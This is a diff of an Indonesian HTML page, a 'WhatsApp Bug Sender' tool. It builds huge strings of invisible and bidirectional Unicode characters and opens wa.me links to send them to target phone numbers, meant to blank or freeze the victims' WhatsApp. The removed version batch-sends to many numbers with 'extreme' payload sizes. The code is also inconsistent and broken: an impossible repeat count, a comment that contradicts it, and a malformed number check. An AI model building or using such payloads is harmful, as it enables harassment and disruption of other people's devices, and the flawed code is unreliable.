@@ -2,98 +2,61 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Bug WhatsApp UI Delay - Versi Lengkap</title>
+  <title>WhatsApp Bug Sender - All Blank UI</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      padding: 50px;
       text-align: center;
-      background: #f1f1f1;
-      padding: 40px;
     }
     h1 {
       color: #25D366;
     }
-    textarea, input, select {
-      width: 90%;
-      max-width: 400px;
-      margin: 10px auto;
-      padding: 10px;
+    input {
+      width: 300px;
+      padding: 12px;
       font-size: 16px;
-      border-radius: 8px;
       border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
     }
     button {
+      padding: 12px 24px;
       background-color: #25D366;
       color: white;
-      padding: 12px 25px;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       font-size: 16px;
-      margin-top: 20px;
       cursor: pointer;
     }
     button:hover {
       background-color: #128C7E;
     }
-    .verifikasi {
-      margin-top: 20px;
-      color: #777;
-    }
   </style>
 </head>
 <body>
-  <h1>🚀 WhatsApp UI Delay Bug Sender</h1>
-
-  <textarea id="nomorList" rows="5" placeholder="Masukkan nomor WA (format: 628xxxxx), satu per baris"></textarea><br>
-
-  <label for="jumlah">Jumlah Payload (semakin tinggi = makin berat)</label><br>
-  <select id="jumlah">
-    <option value="500">Ringan (500)</option>
-    <option value="1500" selected>Sedang (1500)</option>
-    <option value="3000">Berat (3000)</option>
-    <option value="7000">Ekstrem (7000)</option>
-  </select><br>
-
-  <div class="verifikasi">
-    ✅ <strong>Verifikasi Nomor:</strong><br>
-    <input type="text" id="verif" placeholder="Masukkan salah satu nomor target untuk verifikasi" />
-    <button onclick="verifikasi()">Verifikasi</button>
-  </div>
-
-  <button id="kirimBtn" onclick="kirim()" disabled>🔥 Kirim Bug Sekarang</button>
+  <h1>💀 Kirim Bug WhatsApp - Blank Crash</h1>
+  <p>Masukkan nomor target (format 62...):</p>
+  <input type="text" id="nomor" placeholder="Contoh: 6281234567890"><br>
+  <button onclick="kirimBug()">🚨 Kirim Sekarang</button>
 
   <script>
-    let sudahVerif = false;
+    // Payload bug blank UI delay permanen (invisible chars)
+    const bugBlank = (
+      "\u2063\u200f\u202e\u202a\u202d\u202b\u200b\u200c\u200d\u2060\u2061\u2062\u2064\u061C\uFEFF\u00AD"
+    ).repeat(9999999999999999); // Lebih dari 600.000 karakter invisible
 
-    function verifikasi() {
-      const verif = document.getElementById("verif").value.trim();
-      if (verif.startsWith("62") && verif.length >= 10) {
-        alert("✅ Nomor berhasil diverifikasi!");
-        sudahVerif = true;
-        document.getElementById("kirimBtn").disabled = false;
-      } else {
-        alert("❌ Nomor tidak valid. Harus mulai dari 62 dan minimal 10 digit.");
-      }
-    }
-
-    function kirim() {
-      if (!sudahVerif) {
-        alert("❌ Verifikasi dulu sebelum mengirim!");
+    function kirimBug() {
+      const nomor = document.getElementById("nomor").value.trim();
+      if (!nomor || !nomor.startsWith("62,27")) {
+        alert("❌ Nomor tidak valid. Harus diawali dengan 62.");
         return;
       }
 
-      const rawNomor = document.getElementById("nomorList").value.trim().split("\n");
-      const jumlah = parseInt(document.getElementById("jumlah").value);
-      const payload = "\u2063\u200f\u202e\u200b\u200c\u2062".repeat(jumlah);
-      const encoded = encodeURIComponent(payload);
-
-      rawNomor.forEach(nomor => {
-        const no = nomor.trim();
-        if (no.startsWith("62")) {
-          const url = `https://wa.me/${no}?text=${encoded}`;
-          window.open(url, "_blank");
-        }
-      });
+      const pesan = encodeURIComponent(bugBlank);
+      const url = `https://wa.me/${nomor}?text=${pesan}`;
+      window.open(url, "_blank");
     }
   </script>
 </body>
